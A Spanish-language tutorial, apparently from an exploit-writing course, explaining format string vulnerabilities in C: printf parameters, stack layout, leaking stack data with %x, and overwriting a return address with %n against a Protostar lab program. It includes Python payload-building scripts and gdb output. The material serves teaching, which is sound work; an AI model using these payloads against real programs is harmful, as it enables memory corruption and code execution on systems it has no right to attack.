# FORMAT STRING

La vulnerabilidad de Format String es muy peligrosa. Explotada correctamente permite a un atacante leer y/o escribir en cualquier zona de memoria.

Esta vulnerabilidad se da, obviamente, en las funciones de C que dan formato a cadenas de caracteres introducidas por el usuario como puede ser **printf().**

### **Cadena de formato (Format String)**

Parte de su vulnerabilidad se ve provocada por el hecho de que son funciones con argumentos variables. Por ejemplo, la función `printf(const char* format, ...)` requiere de un primer parámetro denominado **format string** o **cadena de formato**, seguida por 0 o más argumentos.

El format string es la cadena a mostrar. Se compone, por un lado, de caracteres ordinarios (exceptuando -por ejemplo- el caracter reservado `%`) que se copian sin cambios a la salida y, por otro, de parámetros de formato que comienzan con el simbolo `%` seguido de un indicador de conversión (`%d` o `%x` por ejemplo). De esta manera el format string da la pauta de la cantidad de argumentos que serán representados en la salida.\
Cuando se detecta en el format string un símbolo `%` se busca el siguiente argumento de la función y se lo convierte a la representación indicada por el parámetro de formato (sea `%x`, `%d`, etc) y así sucesivamente.

Por ejemplo en `printf ("El año %d", 1984)` el format string `"El año %d"` tiene un único parámetro de formato `%d`. Inicialmente la función imprime el string **“El año “,** se detiene en `%d` y **busca en la pila el siguiente argumento que lo reemplazará**, en este caso “`1984`”. Lo procesa como decimal resultando en la sálida: **“El año 1984”**.

```c
printf ("El año %d.", 1984)

El año 1984.
```

En cambio si el parámetro indicara una conversión a la representación hexadecimal se obtendría el siguiente resultado:

```c
printf ("El número %d en representación hexadecimal es: %x.", 1984, 1984)

El número 1984 en representación hexadecimal es: 7C0.
```

### Parámetros de formato

La siguiente tabla especifica los diferentes tipos de parámetros de formato y cómo se pasan a la función `printf()` sea como valor o como puntero.



| Parámetro | Salida                     | Cómo se pasa a la función |
| --------- | -------------------------- | ------------------------- |
| %d        | int (decimal)              | Por valor                 |
| %u        | unsigned int (decimal)     | Por valor                 |
| %x        | unsigned int (hexadecimal) | Por valor                 |
| %s        | char \* (string)           | Por referencia            |
| %n        | int \*                     | Por referencia            |



Hay dos tipos de parámetros:

1. **De lectura** (como `%s, %d, %x`): dan formato a la salida de acuerdo al parámetro de formato.
2. **De escritura** (como `%n`): el parámetro `%n` toma una dirección como argumento dónde almacena la cantidad de bytes escritos hasta ese punto. La utilidad de este parámetro radica en conocer la longitud del output con formato, como por ejemplo en el siguiente programa:

```c
int contador;
printf("%s%n\n", "012345", &contador);
printf("contador = %d\n", contador);

user@abos:~$ ./contador 
012345
contador = 6
```

El parámetro `%n` escribe en 4 bytes la cantidad de caracteres impresos por salida estándar. Como se imprimieron seis caracteres en total (“012345”), va a escribir 0x00000006 dentro de la variable contador. En cambio `%hn` (con una `h` de _half_ como formato adicional de longitud) escribe esa cantidad en un short de 2 bytes, es decir 0x0006. Obviamente el parámetro `%hhn` lo hará en un único byte: 0x06.

También existen otras opciones de formato opcionales:

1. **Nro. argumento**: `%<nro argumento>$parametro`\
   Por ejemplo `%2$d` imprime el segundo argumento que se le haya pasado a la función. Por ejemplo en el caso: `printf("Este es el segundo argumento %2$d", 0, 1, 2)` imprime directamente `1`.
2. **Longitud**: `%<longitud>parametro`\
   Para ello se usa la `h` de _half_ y `hh` de _half of the half_. Por ejemplo, como vimos `%n` escribe la cantidad de caracteres impresos dentro de 4 bytes, pero al agregar un formato de longitud: `%hn` los escribe dentro de 2 bytes y `%hhn` en un byte.
3. **Padding**: `%<padding>parametro`\
   Por ejemplo `%3d` procesa el valor como decimal y agrega espacios si su longitud no llega a 3 caracteres. En cambio con `%03d` se reemplazan los espacios por ceros en longitudes menores a 3.\
   Como veremos más adelante el padding se va a utilizar frecuentemente en la escritura de exploits junto al parámetro `%n`, ya que el padding permite adecuar la cantidad de caracteres impresos que el `%n` va a escribir.

```c
int num=0x8;
   
printf("%d%n\n", num, &contador)    # imprime "8"; contador = 1
printf("%3d%n\n", num, &contador)   # imprime "   8"; contador = 3
printf("%9d%n\n", num, &contador)   # imprime "        8"; contador = 9
```

En el ejemplo se observa cómo al agregar el número 9 al format string `%9d%n` se modificó arbitrariamente el valor del contador sin más complicaciones.\
También es posible aprovechar este recurso para facilitar la visualización de los datos. Por ejemplo si se trata de direcciones, con el format string `%08x` imprimimos valores en hexadecimal con un padding de 8 digitos.

```c
printf("%x\n", dato)    # imprime "2ad"
printf("%8x\n", dato)   # imprime "     2ad"
printf("%08x\n", dato)  # imprime "000002ad"
```

### El papel de la pila <a href="#el-papel-de-la-pila" id="el-papel-de-la-pila"></a>

El siguiente ejemplo fue tomado de [SkullSecurity](https://fundacion-sadosky.github.io/guia-escritura-exploits/format-string/5-format-string.html#material-consultado).

El manejo de la pila en el llamado a función `printf("Una cadena %s y un número %d", str, numero)` en **pseudo assembler** es:

```nasm
push numero
push str
push "Una cadena %s y un número %d"
call printf
add esp, 0xc
```

Es decir, se almacenan los 3 argumentos de `printf()` en orden inverso (incluyendo el format string) tal como indica la **convención del llamado a funciones**. Después se llama a `printf()` y cuando esta función retorna, se restan los 12 bytes usados para los argumentos (`add esp, 0xc`).

Es importante aclarar que cuando `printf()` es llamada la función **no conoce cuantos argumentos recibió sino que da por sentado que la pila está correctamente construida** **e infiere el número de argumentos por la cantidad de parámetros de formato (%...) presentes en el format string**. Entonces esta función toma el format string que se le dió como argumento y lo imprime hasta llegar a especificadores comenzados por `%`, a los que reemplaza por contenido que toma de la pila. `printf()` sigue al pié de la letra lo indicado por el format string sin importar lo que se encuentre almacenado efectivamente en la pila, a la que considera meramente un cúmulo de datos.

Si consideramos el siguiente programa:

```c
#include <stdio.h>

int main(int argc, char *argv[]){
  printf("%x %x %x\n");
}
```

Lo compilamos y ejecutamos:

```bash
user@abos:~$ ./test
bffff7a4 bffff7ac b7e563fd
```

¿A dónde fue a parar el string “%x” y por qué aparecen números? Aunque `printf()` tenía como único argumento el format string “`%x %x %x`”, por cada parámetro `%x` buscó datos de la pila y los imprimió asumiendo que fue llamada con un número mayor de argumentos.

Para ver el estado de la pila con el llamado a `printf()` va a ser de utilidad incluir variables locales, cuya ubicación en la pila es conocida. Entonces complejizamos el ejemplo:

```c
int funcion_a(int param_b, int param_c){
  int var_local = 0x123;
  char str[12] = "AAAABBBBCCCC";

  printf("%x %x %x %x %x %x %x\n");
}

int main(int argc, char *argv[]){
  funcion_a(0x1000, 0x10);
}
```

Cuando se hace el llamado a la `funcion_a(0x1000,0x10)` el **pseudo assembler** que manipula la pila es el siguiente:

```nasm
; llamado a funcion_a(0x1000, 0x10)

   push 0x10
   push 0x1000
=> call funcion_a
   add esp, 8
```

Y al ejecutar la instrucción de `call funcion_a` el estado de la pila es el siguiente:

![pila](https://fundacion-sadosky.github.io/guia-escritura-exploits/format-string/imagenes/teoria/pila-printf.png)

El pseudo assembler de `funcion_a`:

```nasm
<func_a>:
   push   ebp                             ; backup viejo frame pointer
   mov    ebp,esp                         ; seteo nuevo frame pointer
   sub    esp,0x10                        ; espacio para 16 bytes de var locales

   mov    DWORD PTR [ebp-0x4],0x123 		
   mov    DWORD PTR [ebp-0x8],0x41414141  ; "AAAA"
   mov    DWORD PTR [ebp-0xc],0x42424242  ; "BBBB"
   mov    DWORD PTR [ebp-0x10],0x43434343 ; "CCCC"

   push   0x80484d0                       ; format string "%x %x %x %x %x %x %x\n"
=> call   80482d0 <printf@plt>            ; llamado a printf()				
   add    esp,0x4                         ; elimino el format string de la pila

   add    esp,0x10                        ; elimino var locales de la pila
   pop    ebp                             ; restauro viejo frame pointer  
   ret    
```

En el instante anterior a llamar a `printf()` el estado de la pila es:

![pila](https://fundacion-sadosky.github.io/guia-escritura-exploits/format-string/imagenes/teoria/pila-printf-2.png)

Y cuando se llama a `printf()` se apila la dirección de retorno y se mapea dentro de la pila cada uno de los `%x` de la siguiente manera:

![pila](https://fundacion-sadosky.github.io/guia-escritura-exploits/format-string/imagenes/teoria/pila-printf-3.png)

Es posible confirmar esto ejecutando el programa y observando los datos de la pila que se imprimen:

```
user@abos:~$ ./test
41414141 42424242 43434343 123 bffff718 804843b 1000
```

La función `printf("%x %x %x %x %x %x %x\n")` busca en la pila esos 7 argumentos aunque no se hayan definido sus valores de manera explícita bajo la forma `printf("%x %x %x %x %x %x %x\n", valor1, valor2 ...)`. E imprime el contenido de la pila por salida estándar representado en hexadecimal.

## ¿Cómo funcionan las vulnerabilidades del tipo format string? <a href="#como-funcionan-las-vulnerabilidades-del-tipo-format-string" id="como-funcionan-las-vulnerabilidades-del-tipo-format-string"></a>

La clave es directa o indirectamente controlar la cadena de formato. Códigos como `printf(foo)` son vulnerables si suponemos que `foo` se toma de un input de usuario que podrá contener parámetros de formato %. Al ser funciones con argumentos variables si se introduce `%s %x %n` como argumento, se forzará a que la función `printf("%s %x %n")` busque en la pila esos 3 argumentos (por su valor o su referencia según corresponda) y los imprima por salida estándar.

### Filtración de datos en la pila <a href="#filtracion-de-datos-en-la-pila" id="filtracion-de-datos-en-la-pila"></a>

Cuando controlamos la cadena de formato es posible filtrar datos de la pila del proceso. Así una vulnerabilidad de format string puede ser un primer paso para detectar una dirección de retorno que pueda usarse en un desbordamiento de búfer. O incluso para filtrar el valor del [_canario_ de la pila](https://fundacion-sadosky.github.io/guia-escritura-exploits/configuracion.html#deshabilitar-canary-de-protecci%C3%B3n-de-la-pila).

Por ejemplo si controlamos el format string gracias al código `printf(argv[1])` podemos pasar los siguientes inputs:

1. `printf("%x")`: si damos como input el string `"%x"` logramos imprimir 4 bytes de la pila bajo la representación hexadecimal.
2. `printf("%s")`: si ingresamos como input el string `"%s"` la funcion toma 4 bytes de la pila, la considera un puntero a un string e imprime la memoria a la que apunta.

Ejemplo tomado de [Exploit Exercises](https://fundacion-sadosky.github.io/guia-escritura-exploits/format-string/5-format-string.html#material-consultado)

```c
#include <stdio.h>
#include <string.h>

void vuln(char *string){
  printf(string);
}
  
int main(int argc, char **argv){
  vuln(argv[1]);
}
```

Lo compilamos y ejecutamos con los siguientes argumentos.

```bash
user@abos:~$ ./protostar1 AAAA
AAAA
user@abos:~$ ./protostar1 %x %x %x
bffff6c8 804841c bffff89c 
```

Vemos que al pasarle el parámetro `%x` reiteradas veces logramos imprimir el contenido de la pila del proceso.

En muchos casos nos va a interesar imprimir el format string mismo, ya que si logramos imprimir un string que controlamos vamos a poder escribir en un string (o mejor dicho en una dirección) que controlamos.\
Para imprimir el contenido de la pila hasta ver el propio format string que proveemos como parámetro, armamos un input más extenso con un comienzo reconocible (`\x41\x41\x41\x41...`). Incluimos el parámetro con padding `"%08x"` para visualizar más cómodamente los datos:

```python
#!/usr/bin/env python

import sys

def pad(s):                                #padding
    return (s + "A"*1000)[:1000]        

exploit = "AAAAAAAAAAAAAAAAAAAAAAAAAAA"    #comienzo del format string reconocible
exploit += "%08x ." * 150                  #parámetros para imprimir la pila

sys.stdout.write(pad(exploit))
```

Inspeccionamos el output hasta encontrar el comienzo del format string:

```bash
user@abos:~$ ./r.sh gdb ./protonstar1
(gdb) r "$(./exploit.py)"
```

![debug](https://fundacion-sadosky.github.io/guia-escritura-exploits/format-string/imagenes/teoria/debug-protonstar-3.png)

Los valores `\x41\x41\x41\x41...` resaltados son el comienzo del format string (dejamos de lado las primeras dos “AA” por una cuestión de alineamiento). Ello indica que uno de los parámetros `"%08x"` logra imprimir la parte de la pila en la que está almacenado el format string que ingresamos como usuario.

> **Consideraciones**:
>
> Padding: la función `pad(s)` se creó para que `printf()` siempre reciba un input de igual longitud. Esto se debe a que los argumentos se almacenan en la pila antes del llamado a una función, por lo que modificar su longitud hará que la configuración inicial de la pila del programa cambie.\
> Para simplificar los cálculos en el offset del exploit debemos controlar la cantidad de datos en la pila y por ende es clave siempre ingresar un input siempre de igual longitud.

{% hint style="warning" %}
Hay que tener en cuenta que printf() deja de leer cuando alcanza un null byte.

Esto significa que si queremos leer una dirección que contiene \x00, tendremos un problema y tendremos que buscar alternativas como por ejemplo poner el parámetro de formato antes de la dirección que queremos ver:


{% endhint %}

Hay que tener en cuenta que printf() deja de leer cuando alcanza un nullb

### Escritura en cualquier ubicación de memoria <a href="#escritura-en-cualquier-ubicacion-de-memoria" id="escritura-en-cualquier-ubicacion-de-memoria"></a>

Imprimir memoria de la pila con `%x` permite filtrar información relevante, pero también facilita futuros cálculos necesarios para lograr un ataque más sofisticado.&#x20;

#### **Obtener el offset**

**El punto clave es conocer cuál de los parámetros `%08x`** **es el que imprime el comienzo del format string.** Si contamos con esa información podemos incluir al principio del format string ya no `"AAAA..."` sino una dirección cuyo contenido queramos inspeccionar o en la cual queramos escribir un valor.\
Con este objetivo, primero debemos identificar ese parámetro `%08x` que imprime el comienzo del format string. Y luego lo reemplazamos por `%s` o `%n` para inspeccionar o imprimir en esa dirección de memoria.

#### Redirigir el flujo mediante escritura arbitraria

En este caso el objetivo será escribir en un sector de la pila y ya no sólo imprimir su contenido. Siguiendo con el mismo programa de ejemplo, suponemos un escenario en el que queremos sobreescribir una dirección de retorno para reemplazarla -por ejemplo- por la dirección de nuestro shellcode. Supongamos que esa dirección de retorno está almacenada en la pila en la dirección `0xbffff364`, lo primero que hacemos es incluir esa dirección al comienzo del format string:

```python
#!/usr/bin/env python

import sys
from struct import pack

def pad(s):                       #evita variaciones en pila por long. de input
    return (s + "A"*1000)[:1000]        

ret_addr = 0xbffff364             #addr a sobreescribir

exploit  = "AA"                   #alineacion de ret_addr
exploit += pack("<I", ret_addr)   #incluimos ret_addr en format string
exploit += "%08x ." * 150

sys.stdout.write(pad(exploit))
```

Creamos un input que comienza con `AA` -para lograr la alineación de la `ret_addr`- seguido de la dirección de retorno.\
Si ejecutamos vemos al comienzo del output que la función `printf()` imprime las dos `"AA"` y la dirección de retorno como caracteres no imprimibles. Pero si observamos el resto de la impresión de la pila, vemos esas dos `0x4141` seguidas de la dirección `0xbffff364` (que subrayamos en la imagen a continuación).\


![](https://fundacion-sadosky.github.io/guia-escritura-exploits/format-string/imagenes/teoria/debug-protostar-2.png)

Entonces sabemos que un determinado especificador `%08x` es el que imprime `0xbffff364`, por lo que nos queda descubrir cuál es. Con `gdb` después de prueba y error analizando el output y quitando parámetros, descubrimos que el `%08x` número 120 es el encargado de imprimir la `ret_addr`.

```python
#!/usr/bin/env python

import sys
from struct import pack

def pad(s):                       
    return (s + "A"*1000)[:1000]        

ret_addr = 0xbffff364             #addr a sobreescribir

exploit  = "AA"                   
exploit += pack("<I", ret_addr)
exploit += "%08x ." * 120         #el último parámetro imprime la ret_addr

sys.stdout.write(pad(exploit))
```

Como vemos después de la dirección `0xbffff364` (subrayada en la imagen anterior) se continuan imprimiendo las “A” del padding.

![](https://fundacion-sadosky.github.io/guia-escritura-exploits/format-string/imagenes/teoria/debug-protonstar-4.png)

En este punto si reemplazamos el parámetro `%08x` número 120 por `%n` ya no imprimimos la dirección de retorno sino que **escribimos** la cantidad de bytes impresos **en** la dirección de retorno `0xbffff364`.\
Para probar escribir en memoria adecuamos el script:

```python
#!/usr/bin/env python

import sys
from struct import pack

def pad(s):                       
    return (s + "A"*1000)[:1000]        

ret_addr = 0xbffff364             #addr a sobreescribir

exploit  = "AA"                   
exploit += pack("<I", ret_addr)
exploit += "%08x ." * 119         #imprime pila
exploit += "%n"                   #param. nro 120: sobreescribe ret_addr

sys.stdout.write(pad(exploit))
```

Cuando lo ejecutemos:

```bash
user@abos:~$ ./r.sh gdb ./protonstar1
(gdb) r "$(./exploit.py)"
Program received signal SIGSEGV, Segmentation fault.
0x000004ac in ?? ()
(gdb) x/wx 0xbffff364 
0xbffff364: 0x000004ac
```

Efectivamente logramos sobreescribir en la dirección de retorno `0xbffff364` el valor `0x000004ac`, que no es otra cosa que la cantidad de caracteres impresos hasta el `%n`. De ahí que cuando el programa intente retornar provoque una violación de segmento. De esta manera podriamos sobreescribir una dirección de retorno o una entrada de la GOT por la dirección de nuestro shellcode por ejemplo, manipulando la cantidad de caracteres impresos por el format string para que el número que escribamos sea la dirección donde ubicamos el código malicioso. Esta estrategia se logra paso a paso en la [práctica 5](https://fundacion-sadosky.github.io/guia-escritura-exploits/format-string/5-practica.html).

En conclusión es posible aprovecharse de vulnerabilidades del tipo format string para imprimir el contenido de la pila de un proceso o para escribir un valor arbitrario en una dirección de memoria arbitraria.
